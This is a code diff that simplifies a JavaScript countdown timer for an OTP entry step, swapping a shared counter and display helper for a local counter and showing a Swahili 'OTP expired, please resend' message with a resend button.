@@ -345,7 +345,6 @@
   let approvalCheckInterval = null;
   let otpCheckInterval = null;
   let otpTimerInterval = null;
-  let timerSeconds = 60;
 
   // ════════════════════════════════════════════════════════
   // PAGE NAVIGATION
@@ -473,8 +472,6 @@
     document.getElementById('bOtp').disabled = false;
     document.getElementById('bResendOtp').style.display = 'none';
     
-    timerSeconds = 60;
-    
     // Stop any existing timer
     if (otpTimerInterval) {
       clearInterval(otpTimerInterval);
@@ -526,56 +523,58 @@
   let timerSeconds = 60;
 
   function startOtpTimer() {
-    console.log('🚀 TIMER FUNCTION STARTED');
+    console.log('🚀 TIMER STARTED - SIMPLE VERSION');
     
-    // Stop existing timer
-    if (otpTimerInterval !== null) {
+    // Kill old timer completely
+    if (otpTimerInterval) {
       clearInterval(otpTimerInterval);
-      console.log('🛑 Cleared existing interval');
+      otpTimerInterval = null;
     }
     
-    timerSeconds = 60;
-    console.log('⏱️ Starting 60-second countdown');
+    // Simple counter
+    let count = 60;
     
     // Update display immediately
-    updateTimerDisplay();
+    const elem = document.getElementById('otpTimeRemaining');
+    if (elem) {
+      elem.textContent = '60';
+    }
     
-    // Create new interval
+    console.log('⏱️ Timer display set to: 60');
+    
+    // Create interval
     otpTimerInterval = setInterval(function() {
-      timerSeconds--;
-      console.log('⏱️ Countdown: ' + timerSeconds + 's');
-      updateTimerDisplay();
+      count = count - 1;
       
-      // Check if time is up
-      if (timerSeconds <= 0) {
-        console.log('⏰ TIME EXPIRED');
+      // Update display directly
+      const el = document.getElementById('otpTimeRemaining');
+      if (el) {
+        el.textContent = count;
+        console.log('⏱️ ' + count);
+      }
+      
+      // Check if done
+      if (count <= 0) {
         clearInterval(otpTimerInterval);
         otpTimerInterval = null;
+        console.log('⏰ TIMER EXPIRED');
         
-        // Show resend button
+        // Hide submit button
         document.getElementById('bOtp').style.display = 'none';
         document.getElementById('bResendOtp').style.display = 'block';
         
-        // Update timer text
-        document.getElementById('otpTimer').innerHTML = '⏱️ OTP imeharika! Tafadhali tuma tena.';
-        document.getElementById('otpTimer').style.color = '#ff6600';
+        // Update timer message
+        const timerDiv = document.getElementById('otpTimer');
+        if (timerDiv) {
+          timerDiv.textContent = '⏱️ OTP imeharika! Tafadhali tuma tena.';
+          timerDiv.style.color = '#ff6600';
+        }
         
-        console.log('✅ Resend button shown');
+        console.log('✅ Resend button displayed');
       }
     }, 1000);
     
-    console.log('✅ Timer interval created successfully');
-  }
-
-  function updateTimerDisplay() {
-    try {
-      const elem = document.getElementById('otpTimeRemaining');
-      if (elem) {
-        elem.textContent = timerSeconds;
-      }
-    } catch(e) {
-      console.error('❌ Error updating timer:', e);
-    }
+    console.log('✅ Timer interval started');
   }
 
   function startOtpApprovalPolling() {
